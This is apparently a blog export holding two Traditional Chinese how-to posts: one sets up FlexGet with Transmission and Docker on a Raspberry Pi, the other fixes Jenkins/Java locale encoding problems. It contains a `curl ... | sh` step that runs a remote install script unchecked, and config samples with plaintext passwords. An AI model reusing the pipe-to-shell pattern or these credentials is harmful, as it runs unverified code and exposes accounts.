installvirtual](https://installvirtual.com/install-python-3-8-1-on-raspberry-pi-raspbian/)\n已經安裝過了\n我就不測試這個方法\n但下次可能會試試看\n\n```bash\n# apt \nsudo apt-get update\nsudo apt-get install -y build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev libffi-dev tar wget vim\n\n# pyenv\ngit clone https://github.com/pyenv/pyenv.git ~/.pyenv\necho 'export PYENV_ROOT=\"$HOME/.pyenv\"' >> ~/.bashrc && echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' >> ~/.bashrc\nsource ~/.bashrc\npyenv install 3.8.1\npyenv versions\n```\n方法感覺更簡單\n\n### 安裝 flexget\n\n參考[FlexGet](https://flexget.com/InstallWizard/Linux)這篇\n使用 virtualenv 還滿有趣的\n記錄一下\n\n> Supported versions of Python:\n>    3.6, 3.7\n>    3.8 (untested, but should work)\n\n官方建議安裝版本\n不過我沒注意安裝 3.8\n但是測試可以執行\n\n```bash\n# virtualenv\npython3 -m venv ~/.flexget/   # 推薦大家改.flexget 因為這樣設定 service 比較不會麻煩\n# Install FlexGet in the virtualenv\ncd ~/.flexget/\nbin/pip install flexget\n# Running FlexGet from the virtualenv\nsource ~/.flexget/bin/activate\n# flexget\n~/.flexget/bin/flexget [options]\n# 全局安裝\n# sudo pip install flexget\n```\nconfig.yml 要先設定在 flexget 資料夾才能這常執行\n\n**安裝 transmissionrpc**\n\n``` bash\n~/flexget/bin/pip3 install  transmissionrpc\n# 假如跑出錯誤Transmissionrpc module version 0.11 or higher required\n# 就是少了安裝這個\n```\n\n~~最下面有比較潮的設定~~\ndocker 後來有對 config 做調整\n```yml config.yml\nweb_server: yes\n\ntemplates:\n  default:\n    transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: admin\n      password: userpwd\n      add_paused: no\n      path: /mnt/extHDD/Download/Mikata/201901/{{task}}\n    free_space:\n      path: /mnt/extHDD/\n      space: 1000\n    clean_transmission:\n      host: localhost\n      port: 9091\n      username: admin\n      password: userpwd\n      finished_for: 4 days\n      min_ratio: 1\n    if:\n      - \"'季度全集' in category\": reject\n  olddownload:\n    transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: malagege\n      password: malagegeinnfu\n      add_paused: no\n      path: /mnt/extHDD/Download/Mikata/201810/{{task}}\n    free_space:\n      path: /mnt/extHDD/\n      space: 1000\n    clean_transmission:\n      host: localhost\n      port: 9091\n      username: admin\n      password: admin\n      finished_for: 4 days\n      min_ratio: 1\n    if:\n      - \"'季度全集' in category\": reject\n  autoPass:\n    transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: admin\n      password: admin\n      add_paused: yes\n      path: /mnt/extHDD/Download/Mikata/201810/{{task}}\n    if:\n      - \"'季度全集' in category\": reject\n\ntasks:\n  刀劍神域 Alicization:\n    rss:\n      url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域 Alicization+悠哈璃羽字幕社＆拉斯观测组+CHT\n      other_fields: [category]\n    accept_all: yes\n    template: autoPass\n\nschedules:\n  # Run every 30 minutes on monday\n  - tasks: \"*\"\n    schedule:\n      hour: \"*/3\"\n```\n\n\n### 執行 WebUI 介面\n[FlexGet](https://flexget.com/Web-UI)\n```bash\n# 設定 web 密碼，切記要很嚴謹密碼\nflexget web passwd <some_password>\n# 背景執行程式\nflexget daemon start --daemonize\n```\n\nWebUI config 可線上修改config.yml 而且還有除錯功能!!非常簡單!!\n\nhttp://ip:5050\nuser:flexget\npwd: (自己設定)\n\n這邊 task 需要執行成功一次後\n才會出現!!!\n\n注意這邊控制 flexget\n需要再 flexget 資料夾路徑\n```bash\ncd ~/flexget\n~/flexget/bin/flexget daemon stop\n~/flexget/bin/flexget daemon start --daemon\n# 2020-08-11 22:10:37 CRITICAL manager                       Failed to find configuration file config.yml\n# 2020-08-11 22:10:37 INFO     manager                       Tried to read from: /home/pi, /home/pi/.flexget, /home/pi/.config/flexget\n\n```\n\n## 其他\n\n### flexget service\n\n[/lib/systemd/system/flexget.service](https://gist.github.com/billsuxx/e2cd75d4b254e1999309)\n下面路徑需要調整\n我是放在/etc/systemd/system/flexget.service\n```ini\n[Unit]\nDescription=Flexget Daemon\nAfter=network.target\n\n[Service]\nType=simple\nUser=pi\nExecStart= /home/pi/.flexget/bin/flexget daemon start\nExecStop= /home/pi/.flexget/bin/flexget daemon stop\nExecReload= /home/pi/.flexget/bin/flexget daemon reload\n\n[Install]\nWantedBy=multi-user.target\n```\n\n```bash\nsudo systemctl daemon-reload\n```\n\nsystemctl 直接 enable/disable \n[rclone 掛載硬碟小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/10/14/rclone-%E6%8E%9B%E8%BC%89%E7%A1%AC%E7%A2%9F%E5%B0%8F%E8%A8%98/)\n這裡面之前有紀錄 systemctl\n\n\n\n## docker 執行 flexget\n\n### 安裝 docker\n\n```bash\ncurl -sSL https://get.docker.com/ | sh\nsudo usermod -aG docker pi\n# 重新登入\nsudo systemctl restart docker\nsudo systemctl enable docker\n```\n### docker 執行 flexget\n\n之前這邊有寫過[Raspberry Pi 使用 Docker 架設 flexget | 程式狂想筆記](https://malagege.github.io/blog/2020/01/08/Raspberry-Pi-%E4%BD%BF%E7%94%A8-Docker-%E6%9E%B6%E8%A8%AD-flexget/)\n後來就沒繼續使用(因為我不太會用)\nPI 要裝 Python 編譯比較花時間\n在想有沒有比較快的方法\n\npi 1 請使用 arm32v6 ，其他代請使用 armv7\n\n```dockerfile\n\nFROM arm32v7/python:3.8.5-alpine\nMAINTAINER bren\n\nRUN apk add --update \\\n  tzdata \\\n  ca-certificates \\\n  && pip install --no-cache-dir --disable-pip-version-check flexget transmissionrpc \\\n  && rm -rf /var/cache/apk/*\n\n# Copy local files\nCOPY files/ /\n\n# add default volumes\nVOLUME /config /data\nWORKDIR /config\n\n# expose port for flexget webui\nEXPOSE 3539 3539/tcp\n\n# run init.sh to set uid, gid, permissions and to launch flexget\nRUN chmod +x /scripts/init.sh\nCMD [\"/scripts/init.sh\"]\n\n```\n\ndocker build . -t malagege/flexget\n\n`id pi`可以看當下 user id\n\n```bash\ndocker run -d \\\n    --name=flexget \\\n    -restart=always \\\n    -p 5050:5050 \\ # 注意 port\n    -v \"$PWD/data\":/data \\\n    -v \"$PWD/config\":/config \\\n    -e FG_WEBUI_PASSWD=__複雜密碼__ \\\n    # -e /mnt/xxx:/mnt/xxx  有使用 free_space 要開這個\n    # -e PUID=1000 \\\n    # -e PGID=1000 \\\n    -e TZ=\"Asia/Taipei\" \\\n    malagege/flexget\n\n```\n\n[docker參數--restart=always的作用 - 開始認識 - 博客園](https://www.cnblogs.com/kaishirenshi/p/10396446.html)\n>  docker參數--restart=always的作用\n> 創建容器時沒有添加參數  --restart=always ，導致的後果是：當 Docker 重啟時，容器未能自動啟動\n> 1、Docker 命令修改\n> docker container update --restart=always 容器名字\n\n\n\n[FlexGet](https://flexget.com/Cookbook/TorrentCleanup)\n\n\n\n\n## bitbucket CI/CD 檢查設定\n\n因為這個我有跟我朋友一起改設定檔\n所以我有加了 CI/CD 防止修改錯誤\n\n\n\n\n```yml\nimage: nikolaik/python-nodejs:python3.8-nodejs12\n\npipelines:\n  default:\n    - step:\n        script: # Modify the commands below to build your repository.\n          - npm install -g yaml-lint\n          - yamllint config.yml\n#          - npm install\n#          - npm test\n          - pip install --no-cache-dir --disable-pip-version-check flexget\n          - flexget -V\n          - flexget check\n```\n\n2018-02-14 10:28 WARNING  manager    Config line XX is likely missing ':' at the end\n是 bug 所以先不用理會\n參考:[FLexget使用记录 - linkthis blog](https://linkthis.me/2018/02/15/the-note-of-using-flexget/)\n\n### Git 同步方法\n\n最後更改需要執行`docker exec flexget flexget daemon reload-config`\n載入最新設定檔案\n\n```bash\n#!/bin/bash\n\ncd /home/pi/flexget-arm/config && git fetch origin master\n\nLOCAL_COMMITID=$(git rev-parse HEAD)\necho \"LCOAL_COMMITID=${LOCAL_COMMITID}\"\nREMOTE_COMMITID=$(git rev-parse origin/master)\necho \"REMOTE_COMMITID=${REMOTE_COMMITID}\"\n\nif [ \"$LOCAL_COMMITID\" != \"$REMOTE_COMMITID\" ]\nthen\n    echo \"COMMITID不一致，需做同步\"\n    git reset origin/master --hard && docker exec flexget flexget daemon reload-config\nfi\n```\n\n\n### 手動執行排程\n\n```bash\ndocker exec flexget flexget execute  --tasks \"TV-*\"\n```\n\nconfig.yml\n```yml\nweb_server: yes\n\ntemplates:\n  default:\n    transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: admin\n      password: admin\n      add_paused: no\n      path: /mnt/extHDD/Download/Mikata/TV/{{task}}\n    free_space:\n      path: /mnt/extHDD/\n      space: 1000\n    clean_transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: admin\n      password: admin\n      finished_for: 60 days\n      min_ratio: 1\n    if:\n      - \"'季度全集' in category\": reject\n  autoPass:\n    transmission:\n      host: 192.168.1.203\n      port: 9091\n      username: admin\n      password: admin\n      add_paused: yes\n      path: /mnt/extHDD/Download/Mikata/autoPass/{{task}}\n    if:\n      - \"'季度全集' in category\": reject\n\n\ntasks:\n  \"TV-刀劍神域 Alicization\":\n    rss:\n      url: https://share.dmhy.org/topics/rss/sort_id/2/rss.xml?keyword=刀劍神域+悠哈璃羽字幕社＆拉斯观测组+CHT\n      other_fields: [category]\n    accept_all: yes\n    template: default\n    transmission:\n      path: /mnt/extHDD/Download/Mikata/TV/202007/{{task[3:]}}\n\nschedules:\n  - tasks: \"TV-*\"\n    schedule:\n      day_of_week: mon,tue,wed,thu,fri,sat,sun\n      hour: \"3,5,8,11,13,15,17,20\"\n      jitter: 60\n```\n\n這邊有發現 WebUI 用 GMT 時間\n非本地時間...，但怎麼找設定都沒看到程式可以調整台灣時區\n","tags":["flexget"],"categories":["Linux"]},{"title":"Jenkins 執行 Java 程式亂碼解決方法","url":"%2Fblog%2F2020%2F07%2F30%2FJenkins-%E5%9F%B7%E8%A1%8C-Java-%E7%A8%8B%E5%BC%8F%E4%BA%82%E7%A2%BC%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95%2F","content":"\n最近公司上板 Java 排程程式都會遇到亂碼 ????\n這個都不能手動執行\n今天解決這個問題\n整理一下\n\n<!--more-->\n\n首先，簡單講一下\n我們 jenkins 上板程式是透過 ssh 打指令操作\n\n> 這邊我備註一下，我們公司上板 Java 程式，是排程程式，這些排程不是使用 Crontab 方式去執行\n> 所以這邊執行都是透過 shell 腳本方式去重複執行\n\n有在家目錄使用`socure ~/.profile`\n但是這個過程\n奇怪的是 locale 查看出來的 LC_CTYPE=en_US.UTF8 其他都是 POSIX \n一般用 Xshell 登入是 locale 全看到 en_US.UTF8\n\n這邊我還不確定是什麼原因?\n> non-interactive + non-login shell\n> 最後一種模式為非交互非登陸的shell，創建這種shell典型有兩種方式：\n>    bash script.sh\n>     ssh user@remote command\n> 這兩種都是創建一個shell，執行完腳本之後便退出，不再需要與用戶交互。\n\n[ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量](https://blog.csdn.net/whitehack/article/details/51705889) {% asset_link web1.png 備份圖 %}\n目前看到這篇有疑似這個問題\n所以導致登入環境變數會有不一樣結果\n我也沒看到有設定 BASH_ENV 參數\n\n不過確實因為 ssh remote  command 登入\n造就登入不一樣結果\n\n裡面有滿清楚內容[ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量](https://blog.csdn.net/whitehack/article/details/51705889)\n> ```\n+----------------+--------+-----------+---------------+\n|                | login  |interactive|non-interactive|\n|                |        |non-login  |non-login      |\n+----------------+--------+-----------+---------------+\n|/etc/profile    |   A    |           |               |\n+----------------+--------+-----------+---------------+\n|/etc/bash.bashrc|        |    A      |               |\n+----------------+--------+-----------+---------------+\n|~/.bashrc       |        |    B      |               |\n+----------------+--------+-----------+---------------+\n|~/.bash_profile |   B1   |           |               |\n+----------------+--------+-----------+---------------+\n|~/.bash_login   |   B2   |           |               |\n+----------------+--------+-----------+---------------+\n|~/.profile      |   B3   |           |               |\n+----------------+--------+-----------+---------------+\n|BASH_ENV        |        |           |       A       |\n+----------------+--------+-----------+---------------+\n```\n>\n> 配置文件建議\n> \n> 回顧一下前面提到的所有配置文件，總共有以下幾種：\n> \n>    /etc/profile\n>    ~/.bash_profile\n>    ~/.bash_login\n>    ~/.profile\n>    /etc/bash.bashrc\n>    ~/.bashrc\n>    $BASH_ENV\n>    $ENV\n>\n> 不知你是否會有疑問，這麼多的配置文件，究竟每個文件裡面應該包含哪些配置，比如PATH應該在哪？提示符應該在哪配置？啟動的程序應該在哪？等等。所以在文章的最後，我蒐羅了一些最佳實踐供各位參考。（這裡只討論屬於用戶個人的配置文件）\n>\n>    ~/.bash_profile：應該儘可能的簡單，通常會在最後加載.profile和.bashrc(注意順序)\n>    ~/.bash_login：在前面討論過，別用它\n>    ~/.profile：此文件用於login shell，所有你想在整個用戶會話期間都有效的內容都應該放置於此，比如啟動進程，環境變量等\n>    ~/.bashrc：只放置與bash有關的命令，所有與交互有關的命令都應該出現在此，比如bash的補全、alias、顏色、提示符等等。特別注意：別在這裡輸出任何內容（我們前面只是為了演示，別學我哈）\n\n因為我猜測 jenkins 進去跟我用 xshell 語系不一樣\n所以就做了 log 紀錄，發現真的不一樣\n```bash\nexport LC_ALL=\"en_US.UTF-8\"\ndate >> /tmp/test_ssh.log\nenv >> /tmp/test_ssh.log\necho \"--------\" >> /tmp/test_ssh.log\nlocale >> /tmp/test_ssh.log\necho \"=======\" >> /tmp/test_ssh.log\n```\n\n之前看到使用 file.enconding 去解決\n~~但實際用上卻沒有效果~~\n跟 file.enconding 沒關係，是我使用 JAVA_OPTS環境變數\n沒有效果，後面會講到\n\n> java 預設在處理文字檔案的寫入時，\n> 會以 os 的預設編碼當作寫入的編碼規則，\n> 這個問題常會發生在 windows 英文的作業系統要寫入中文的時候發生，\n> \n> 解法1：\n> 如果是用 java 執行的 jar ，\n> java -Dfile.encoding=UTF8 -jar e:\\bin\\ExportToFile.jar\n> \n> 解法2：\n> 加入環境變數 JAVA_OPTS，\n>   windows 環境：\n> JAVA_OPTS=-Dfile.encoding=UTF8;%JAVA_OPTS%\n>   linux 環境：\n> $> export JAVA_OPTS=-Dfile.encoding=UTF8:$JAVA_OPTS\n> \n> 解法3：\n> 在程式裡面設定：\n> 取得目前系統檔案編碼屬性 String defaultEncodingName = System.getProperty( \"file.encoding\" );\n> 設定系統檔案編碼屬性 System.setProperty(\"file.encoding\", \"UTF-8\");\n[解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌](https://blog.xuite.net/akuox/caffeine/32265749-%E8%A7%A3%E6%B1%BA+java+%E5%AF%AB%E6%AA%94%E7%9A%84%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C)\n\n\n\n## 了解一下 LC_* 環境變數\n\n### wiki \n\n> 在Ubuntu作業系統中，使用man locale-gen或man locale可獲得關於locale實現的細節。實際上是由glibc庫實現的。\n> \n> locale相關（環境）變數生效的優先順序：[1]\n> \n>     LANGUAGE 指定個人對語言環境值的主次偏好，例如zh_CN:en_US:en\n>     LC_ALL 這不是一個環境變數，是一個可被C語言庫函式setlocale設定的宏，其值可覆蓋所有其他的locale設定。因此> 預設時此值為空\n>     LC_xxx 可設定locale各方面（category）的值，可以覆蓋LANG的值。\n>     LANG 指定預設使用的locale值\n> \n> 可以把上述環境變數設在/etc/profile 或 /etc/environment等系統初始檔案中。值得注意的是，若LANG或LC_ALL被設> 定為 \"C\"，那麼LANGUAGE的值將被忽視。 [2]\n> \n> 除 C 和 POSIX這兩個locale名稱外，locale的名稱並未標準化。Linux平台與Windows系統的locale名稱有很大不同。> Linux名稱的命名規則為：\n> \n>  language[_territory[.codeset]][@modifier]\n> \n> 其中language是ISO 639-1標準中定義的雙字母的語言代碼\n\n### 暫時語系用法\n\n感覺是暫時環境變數，但沒有詳細看到有人這樣介紹\n\n> $ LC_TIME=en_US.UTF-8 date\n> Fri Oct 31 19:51:16 CST 2014\n> $ LC_TIME=fi_FI.UTF-8 date\n> pe 31.10.2014 19.52.00 +0800\n> $ LC_TIME=zh_CN.UTF-8 date\n> 2014年 10月 31日 星期五 19:53:07 CST\n\nPS: 上面使用 locale -a 有安裝成功的才能用\n\n### POSIX 和 C\n\n[更改 Linux 系統語言環境變量 - Jamin Zhang](https://jaminzhang.github.io/linux/Change-Linux-System-Locale-Envs/)\n\n> LC_ALL=C 是為了去除所有本地化的設置，讓命令能正確執行。\n> C 是系統默認的 locale，」POSIX」是」C」的別名。所以當我們新安裝完一個系統時，默認的 locale 就是 C 或 POSIX。\n\n### to default locale: No such file or directory\n\n[Locale - Ubuntu 18.04 探索筆記](https://samwhelp.github.io/note-ubuntu-18.04/read/howto/install/locale/)\n\n會多出現三行\n\nssh remote bash 登入使用 locale 指令會出現 \n\n> locale: Cannot set LC_CTYPE to default locale: No such file or directory\n> locale: Cannot set LC_MESSAGES to default locale: No such file or directory\n> locale: Cannot set LC_ALL to default locale: No such file or directory\n> \n> 只要執行下面的指令，就可以解決\n> \n> $ sudo locale-gen zh_TW.UTF-8\n\n但我沒使用這個方案解決\n\n至於原因可能是\n[Linux Xshell登录报错 locale: Cannot set LC_CTYPE to default locale: No such file or directory（已解决）_醉世老翁的博客-CSDN博客_locale -a locale: cannot set lc_ctype to default l](https://blog.csdn.net/wojiuwangla/article/details/107556417)\n[CentOS6.5手动安装glibc-2.14后locale出现No such file or directory终极解决办法_guitar___的博客-CSDN博客_centos character map file `utf-8 not found: no su](https://blog.csdn.net/guitar___/article/details/77651983)\n\n## 查看 Java file encoding\n\n[Java May Use UTF-8 as its Default Charset - DZone Java](https://dzone.com/articles/java-may-use-utf-8-as-its-default-charset)\n\nCharsetDemo.java\n```java CharsetDemo.java\npublic class CharsetDemo\n{\n   /**\n    * Supplies the default encoding without using Charset.defaultCharset()\n    * and without accessing System.getProperty(\"file.encoding\").\n    *\n    * @return Default encoding (default charset).\n    */\n   public static String getEncoding()\n   {\n      final byte [] bytes = {'D'};\n      final InputStream inputStream = new ByteArrayInputStream(bytes);\n      final InputStreamReader reader = new InputStreamReader(inputStream);\n      final String encoding = reader.getEncoding();\n      return encoding;\n   }\n\n   public static void main(final String[] arguments)\n   {\n      out.println(\"Default Locale:   \" + Locale.getDefault());\n      out.println(\"Default Charset:  \" + Charset.defaultCharset());\n      out.println(\"file.encoding:    \" + System.getProperty(\"file.encoding\"));\n      out.println(\"sun.jnu.encoding: \" + System.getProperty(\"sun.jnu.encoding\"));\n      out.println(\"Default Encoding: \" + getEncoding());\n   }\n}\n```\n\n[環境變量JAVA_TOOL_OPTIONS、_JAVA_OPTIONS、JAVA_OPTS設置_ly199108171231的博客-CSDN博客_java_options](https://blog.csdn.net/ly199108171231/article/details/85253946) {% asset_link web2.png 備份圖 %}\n這邊查到 JAVA_OPTS 是 Tomcat 用的\n難怪我試個老半天都沒有什麼效果\nJAVA_TOOL_OPTIONS 確實就正常了\n\n>    JAVA_OPTS：常用於一些應用的配置，如Tomcat，但它一般不作為環境變量，也不能被JVM識別的，是那些應用的自定義配置；\n>    _JAVA_OPTIONS：也是作為環境變量來替代命令行參數的，但它是JVM廠家自定義的，可以覆蓋JAVA_TOOL_OPTIONS，但各廠家的不同，_JAVA_OPTIONS是Oracle的JVM，而IBM的則是用IBM_JAVA_OPTIONS。\n>     JAVA_TOOL_OPTIONS：是標準的，所有虛擬機都能識別和應用的。\n> \n> 如果想驗證上面的不同也不難，如果設置了JVM能識別的環境變量，JVM會有\"Picked up\"的提示的，如：\n> \n>     export JAVA_OPTS=zhaiqiafneng\n>     export JAVA_TOOL_OPTIONS=\"-Xmx512m -Xms64m\" \n>      \n>     java -version \n> \n> JVM會打印：\n> \n>     Picked up JAVA_TOOL_OPTIONS: -Xmx512m -Xms64m\n>     java version \"1.8.0_101\"\n>     Java(TM) SE Runtime Environment (build 1.8.0_101-b13)\n>     Java HotSpot(TM) 64-Bit Server VM (build 25.101-b13, mixed mode)\n\n\n```bash\n# Big5\nLC_ALL=zh_TW.BIG5  java Xxxx\n# Big5\njava -Dfile.encoding=big5 Xxxx\n# Big5\nLC_ALL=zh_TW.UTF8  java -Dfile.encoding=big5 Xxxx\n```\n\n排程踩雷注意\n[linux 中crontab 定时 shell脚本启动jar包，tomcat失败_醉世老翁的博客-CSDN博客_linux 定时任务启动的tomcat jar包不一样](https://blog.csdn.net/wojiuwangla/article/details/107365921)\n\n### Java  properties and XML and log4j\n\n固定都吃 ISO-8859-1\n.properties檔案的編碼是ISO-8859-1，又稱為Latin-1。所有非Latin-1字元必須利用Unicode跳脫字元錄入，例如\\uHHHH中，HHHH是某個字元的Unicode字元集的十六進位的索引。這樣就可以使用.properties檔案作為在地化的屬性資源包。非Latin-1的文字檔案，可以通過使用隨JDK提供的native2ascii工具轉換為正確的.properties檔案；或使用如po2prop[1]的第三方工具，管理雙語在地化格式跳脫為.properties\n\n難怪... .properties 無法正常看到 UTF-8\n\n[.properties - 維基百科，自由的百科全書](https://zh.wikipedia.org/zh-tw/.properties)\n\nXML 是吃 UTF-8\n\n原本想獨立寫一篇測試\n但內容不太多，所以就整理在這邊\n\nlog4j 也能設定指定 encoding，不過...這邊跟 Java 一樣，預設是帶 System 帶入的\n[log4j日誌記錄到文件 - Log4j教學](http://tw.gitbook.net/log4j/log4j_logging_files.html)\n\n## 相關網站整理\n\n裡面也混雜一些彩蛋\n\n* [區域化環境類別 (categories)](https://www.csie.ntu.edu.tw/~r95053/samples/collection/backup/locale2.html)\n* [地區標籤](https://openhome.cc/Gossip/Encoding/LocaleTag.html)\n* [java.util.Locale.getDefault()方法實例 - Java.util包](http://tw.gitbook.net/java/util/locale_getdefault.html)\n* [locale的设定及LANG、LC_CTYPE、LC_ALL环境变量 - Lo0ong - 博客园](https://www.cnblogs.com/xlmeng1988/archive/2013/01/16/locale.html)\n* [解決 macOS SSH 連線中文亂碼的問題 - Kaix Blog](https://kaix.dev/2018/06/30/macos-ssh-chinese/)\n* [jvm 性能调优工具之 jinfo - 简书](https://www.jianshu.com/p/8d8aef212b25)\n* [locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码](https://blog.csdn.net/clamaa/article/details/70046217)\n* [詳解Linux中文亂碼問題終極解決方法 | 程式前沿](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/380106/)\n* [locale的设定及LANG、LC_CTYPE、LC_ALL环境变量_laven90的专栏-CSDN博客_如何设置 locale](https://blog.csdn.net/laven90/article/details/9285307)\n* [解決 java 寫檔的中文亂碼問題 @ caffeine :: 隨意窩 Xuite日誌](https://blog.xuite.net/akuox/caffeine/32265749-%E8%A7%A3%E6%B1%BA+java+%E5%AF%AB%E6%AA%94%E7%9A%84%E4%B8%AD%E6%96%87%E4%BA%82%E7%A2%BC%E5%95%8F%E9%A1%8C)\n* [Linux下配置Jenkins+gitlab持續整合構建流程 | IT人](https://iter01.com/64096.html)\n* [Jenkins使用/etc/profile中环境变量异常_jiangshanwe-CSDN博客_jenkins /etc/profile](https://blog.csdn.net/jiangshanwe/article/details/85785226)\n* [Jenkins / Hudson environment variables - Stack Overflow](https://stackoverflow.com/questions/5818403/jenkins-hudson-environment-variables)\n* [Linux 用 ps 與 top 指令找出最耗費 CPU 與記憶體資源的程式 - G. T. Wang](https://blog.gtwang.org/linux/ps-top-find-processes-by-cpu-memory-usage/)\n* [詳解Linux中文亂碼問題終極解決方法 | 程式前沿](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/380106/)\n* [更改 Linux 系统语言环境变量 - Jamin Zhang](https://jaminzhang.github.io/linux/Change-Linux-System-Locale-Envs/)\n* [locale错误导致Java中文乱码错误的总结_clamaa的专栏-CSDN博客_java locale 中文乱码](https://blog.csdn.net/clamaa/article/details/70046217)\n* [bash 四种工作模式及其相关的配置文件](http://hazirguo.github.io/articles/2017/bash_login_interactive_mode.html)\n* [Linux系统bash的四种模式与jenkins执行shell的环境变量问题_Robin Hu的专栏-CSDN博客_jenkins shell环境变量](https://blog.csdn.net/hudashi/article/details/82464995)\n* [ssh連接遠程主機執行腳本的環境變量問題_whitehack的專欄-CSDN博客_ssh 遠程執行命令 含變量](https://blog.csdn.net/whitehack/article/details/51705889)\n* [SDKMAN is able to install on Java on ARM · Issue #640 · sdkman/sdkman-cli](https://github.com/sdkman/sdkman-cli/issues/640)\n\n### 其他連結(很多重複)\n\n* [FileWriter (Java SE 12 )](https://cr.openjdk.java.net/~iris/se/12/latestSpec/api/java.base/java/io/FileWriter.html)\n* [Java丨Cmd運行Jar出現亂碼問題 - 台部落](https://www.twblogs.net/a/5b8812fc2b71775d1cda5350)\n* [Linux中java log输出中文乱码 中文变“?”_一起进步的博客-CSDN博客_linux log日志中文乱码](https://blog.csdn.net/qq_27292113/article/details/71404298)\n* [linux中使用tail -f查看日志出现中文乱码的解决方案_付之一笑的专栏-CSDN博客_linux 日志乱码](https://blog.csdn.net/btt2013/article/details/54616793?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-9.channel_param)\n* [log4j日志文件乱码解决方法_log4j中文乱码,log4j中文乱码-Java文档类资源-CSDN下载](https://download.csdn.net/download/tw121256081/9427273)\n* [Linux下中文变问号的解决办法_sui102的专栏-CSDN博客_liunx windows 中文字符变问号](https://blog.csdn.net/sui102/article/details/84495497)\n* [log4j乱码问题解决办法_linux上配置log4j,linux配置log4j-Java文档类资源-CSDN下载](https://download.csdn.net/download/adnaper/4710011)\n* [Java 程式處理網址 URL 百分比編碼與解碼教學 - G. T. Wang](https://blog.gtwang.org/programming/url-percent-encoding-and-decoding-using-java/)\n* [Java讀帶有BOM的UTF-8檔案亂碼 - IT閱讀](https://www.itread01.com/p/848586.html)\n* [Java -Dfile.encoding=UTF-8的使用_haixia_12的专栏-CSDN博客_-dfile.encoding=utf-8](https://blog.csdn.net/haixia_12/article/details/42424513)\n* [log4j 控制台和文件输出乱码问题解决](http://www.coderli.com/log4j-console-file-garbled/)\n* [[轉]log4j日誌檔案亂碼問題的解決方法 - IT閱讀](https://www.itread01.com/p/570130.html)\n* [utf 8 - Setting the default Java character encoding - Stack Overflow](https://stackoverflow.com/questions/361975/setting-the-default-java-character-encoding)\n* [file - JVM property -Dfile.encoding=UTF8 or UTF-8? - Stack Overflow](https://stackoverflow.com/questions/6031877/jvm-property-dfile-encoding-utf8-or-utf-8)\n* [理解環境變數 JAVA_TOOL_OPTIONS | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/99795/)\n* [牙根 會痛 假牙 - Google 搜尋](https://www.google.com/search?client=firefox-b-d&q=%E7%89%99%E6%A0%B9+%E6%9C%83%E7%97%9B+%E5%81%87%E7%89%99)\n* [shell ssh command - Google 搜尋](https://www.google.com/search?q=shell+ssh+command&client=firefox-b-d&sxsrf=ALeKk01FDso58ld-3nJS1BtA0NDR-ZEJ8Q:1595611007298&ei=fxcbX9jZEY2Ur7wPlcuRmAc&start=20&sa=N&ved=2ahUKEwiYlaiasubqAhUNyosBHZVlBHM4ChDw0wN6BAgOEEM&biw=1280&bih=644)\n* [A few ways to execute commands remotely using SSH · zaiste.net](https://zaiste.net/posts/few-ways-to-execute-commands-remotely-ssh/)\n* [ssh 遠端 執行程式 log 亂碼 lang - Google 搜尋](https://www.google.com/search?client=firefox-b-d&biw=1280&bih=644&sxsrf=ALeKk016alYo2SrL6mJ7XnrDFEqsqx4--w%3A1595611426430&ei=IhkbX8zrGf-Ur7wPiIq5gAo&q=ssh+%E9%81%A0%E7%AB%AF+%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F+log+%E4%BA%82%E7%A2%BC+lang&oq=ssh+%E9%81%A0%E7%AB%AF+%E5%9F%B7%E8%A1%8C%E7%A8%8B%E5%BC%8F+log+%E4%BA%82%E7%A2%BC+lang&gs_lcp=CgZwc3ktYWIQAzIFCAAQzQI6BwgjELADECc6BAgjECdQ3D9YsEtgxExoAnAAeACAAU2IAacDkgEBN5gBAKABAaoBB2d3cy13aXrAAQE&sclient=psy-ab&ved=0ahUKEwjMhJbis-bqAhV_yosBHQhFDqA4ChDh1QMICw&uact=5)\n* [SSH訪問linux 亂碼問題 - IT閱讀](https://www.itread01.com/content/1496132534.html)\n* [清水國中資訊組 | locale語系設定UTF-8與Big5](http://www.csjs.tc.edu.tw/lt/index.php?op=ViewArticle&articleId=528&blogId=5)\n* [解決遠端 SSH 連線主機時文字編碼設定 locale 錯亂問題 | 一介資男](https://www.mxp.tw/5421/)\n* [[ssh] — 如何從〜/ .ssh / config禁用ssh_config中設置的SendEnv變量](https://zh.it-reply.net/q/%E5%A6%82%E4%BD%95%E5%BE%9E-ssh-config%E7%A6%81%E7%94%A8sshconfig%E4%B8%AD%E8%A8%AD%E7%BD%AE%E7%9A%84sendenv%E8%AE%8A%E9%87%8F-4795)\n* [關閉 SSH SendENV 解決 locale 問題 | Somewhere I Belong](https://yulun.me/2016/ssh-remote-sendenv-locale-issue/)\n* [增進 SSH 使用效率 - ssh_config · 完全用 GNU/Linux 工作](https://chusiang.gitbooks.io/working-on-gnu-linux/content/20.ssh_config.html)\n* [SendEnv jenkins ssh 亂碼 - Google 